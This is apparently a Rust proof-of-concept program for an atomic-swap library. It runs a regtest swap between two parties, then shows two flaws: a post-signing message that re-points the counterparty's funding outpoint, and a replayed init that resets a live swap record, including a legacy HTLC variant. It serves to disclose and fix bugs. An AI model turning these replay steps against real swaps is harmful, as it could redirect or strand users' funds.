use libswap::adaptor_swap::AdaptorState;
use libswap::engine::Engine;
use libswap::params::Network;
use libswap::store::Store;
use std::collections::BTreeMap;

fn engine(tag: &str) -> (Engine, std::path::PathBuf) {
    std::env::set_var("PACT_DISABLE_KEYRING", "1");
    let dir = std::env::temp_dir().join(format!("v2repro-{tag}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    Store::init(&dir, None).unwrap();
    (Engine::open(&dir, None, BTreeMap::new()).unwrap(), dir)
}

fn now() -> u32 {
    std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() as u32
}

fn main() -> anyhow::Result<()> {
    let (alice, ad) = engine("alice");
    let (bob, bd) = engine("bob");
    let n = now();
    let (t1, t2) = (n + 40_000, n + 20_000);
    let (arec, init) = alice.adaptor_init(Network::Regtest, ("btcx".into(), 50_000_000), ("btc".into(), 100_000), t1, t2)?;
    let id = arec.swap_id.clone();
    let (_brec, accept) = bob.adaptor_accept(&init)?;
    alice.recv_adaptor(&accept)?;
    let fa = alice.adaptor_funding_ready(&id, &"aa".repeat(32), 0)?;
    let fb = bob.adaptor_funding_ready(&id, &"bb".repeat(32), 1)?;
    bob.recv_adaptor(&fa)?;
    alice.recv_adaptor(&fb)?;
    let na = alice.adaptor_nonces(&id)?;
    let nb = bob.adaptor_nonces(&id)?;
    bob.recv_adaptor(&na)?;
    alice.recv_adaptor(&nb)?;
    let pa = alice.adaptor_sign(&id)?;
    let pb = bob.adaptor_sign(&id)?;
    bob.recv_adaptor(&pa)?;
    alice.recv_adaptor(&pb)?;
    let a_signed = alice.adaptor_assemble(&id)?;
    let b_signed = bob.adaptor_assemble(&id)?;
    assert_eq!(a_signed.state, AdaptorState::Signed);
    assert_eq!(b_signed.state, AdaptorState::Signed);
    println!("[setup] both Signed; bob.funding_a = {:?}:{:?}", b_signed.funding_a_txid, b_signed.funding_a_vout);

    // ---- Attack 1: pinned initiator re-points the participant's leg-A funding pointer post-Signed ----
    let evil = alice.adaptor_funding_ready(&id, &"dd".repeat(32), 7)?; // signed by Alice, chain "a"
    let after = bob.recv_adaptor(&evil)?;
    println!("[attack1] recv_adaptor(funding_ready a=dd..:7) -> Ok; bob.state={:?} funding_a={:?}:{:?} adaptor_sig_a_unchanged={}",
        after.state, after.funding_a_txid, after.funding_a_vout, after.adaptor_sig_a == b_signed.adaptor_sig_a);

    // Also: a re-sent `nonces` with different values is accepted and overwrites (harmless post-Signed, but no gate)
    let after2 = bob.recv_adaptor(&na)?;
    println!("[attack1b] re-delivered nonces accepted in state {:?}", after2.state);

    // ---- Attack 2: same T (same swap_id) init replayed -> participant's live record reset ----
    let bstore = Store::open(&bd, None)?;
    let before = bstore.get_adaptor(&id)?;
    println!("[attack2] before: state={:?} funding_b={:?} sig_b_present={}", before.state, before.funding_b_txid, before.adaptor_sig_b.is_some());
    let (re, _accept2) = bob.adaptor_accept(&init)?; // same T => same swap_id, accepted again
    let after3 = bstore.get_adaptor(&id)?;
    println!("[attack2] adaptor_accept(same init) -> Ok state={:?}; stored: state={:?} funding_b={:?} sig_b_present={} sig_a_present={}",
        re.state, after3.state, after3.funding_b_txid, after3.adaptor_sig_b.is_some(), after3.adaptor_sig_a.is_some());
    // ---- v1 analog: same H init replayed over a FundedB participant record ----
    let (a1, init1) = alice.offer(Network::Regtest, ("btcx".into(), 50_000_000), ("btc".into(), 100_000), t1, t2, None, None)?;
    let (mut r1, _acc1) = bob.accept(&init1)?;
    r1.state = libswap::swap::State::FundedB;
    r1.htlc_a_txid = Some("aa".repeat(32)); r1.htlc_a_vout = Some(0);
    r1.htlc_b_txid = Some("bb".repeat(32)); r1.htlc_b_vout = Some(0);
    r1.refund_tx_hex = Some("deadbeef".into());
    bstore.put(&r1)?;
    let (r2, _acc2) = bob.accept(&init1)?;
    let stored = bstore.get(&a1.swap_id)?;
    println!("[attack2-v1] accept(same init H) -> Ok state={:?}; stored: state={:?} htlc_b={:?} refund_tx={:?}",
        r2.state, stored.state, stored.htlc_b_txid, stored.refund_tx_hex);
    let _ = std::fs::remove_dir_all(&ad);
    let _ = std::fs::remove_dir_all(&bd);
    Ok(())
}
